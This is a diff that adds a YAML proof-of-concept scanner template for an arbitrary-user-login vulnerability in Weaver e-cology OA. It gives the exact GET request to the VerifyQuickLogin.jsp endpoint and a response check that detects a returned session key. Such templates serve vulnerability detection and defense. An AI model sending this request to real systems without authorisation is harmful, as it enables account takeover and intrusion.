@@ -1,0 +1,16 @@
+id: poc-yaml-weaver-e-cology-oa-arbitrary-user-login
+info:
+  name: 泛微OA e-cology 任意用户登录漏洞
+  severity: high
+  finger: weaver,e-cology
+  osprey-id: vb_2022_0103
+  tags:
+  - 任意用户登录
+requests:
+- method: GET
+  path: /mobile/plugin/VerifyQuickLogin.jsp?identifier=1&language=1&ipaddress=127.0.0.1
+  expression: 'contains(body, "{\"sessionkey\":\"") && contains(body, "\"message\":\"1\"}")
+
+    '
+variables: {}
+transport: http
